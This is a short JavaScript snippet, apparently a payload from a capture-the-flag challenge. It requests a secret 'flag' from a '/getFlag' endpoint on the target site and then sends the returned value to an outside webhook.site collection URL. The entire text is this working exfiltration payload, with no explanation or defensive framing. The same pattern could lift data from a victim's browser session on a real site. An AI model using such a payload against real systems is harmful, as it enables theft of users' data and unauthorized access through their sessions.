fetch('/getFlag', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({giveMe: 'theFlag'})
})
.then(r => r.text())
.then(d => fetch('https://webhook.site/1e5ddff2-bbc7-473d-8b29-95171bdd0f6d?flag=' + d));
